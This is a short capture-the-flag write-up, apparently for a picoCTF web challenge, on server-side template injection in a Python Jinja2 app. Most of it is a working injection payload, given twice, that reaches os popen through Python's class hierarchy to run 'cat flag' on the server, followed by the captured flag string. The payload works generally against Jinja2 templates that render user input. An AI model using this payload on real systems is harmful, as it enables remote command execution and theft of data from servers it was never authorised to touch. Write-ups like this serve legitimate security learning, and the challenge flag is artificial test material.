## Category
Web Exploitation

## Topic
Server Side Template Injection

## Vulnerability
Due to to the template engine my not sanitize inputs and consider them as codes, this allows
hackerss to use malcious payloads to get what the want

## Exploit
Using certain payload you can make this template (python - Jinja2) to do execute commands

```
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == '_wrap_close' %}{{ c.__init__.__globals__['popen']('cat flag').read() }}{% endif %}{% endfor %}
```

```
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == '_wrap_close' %}{{ c.__init__.__globals__['popen']('cat flag').read() }}
{% endif %}
{% endfor %}
```

=> picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}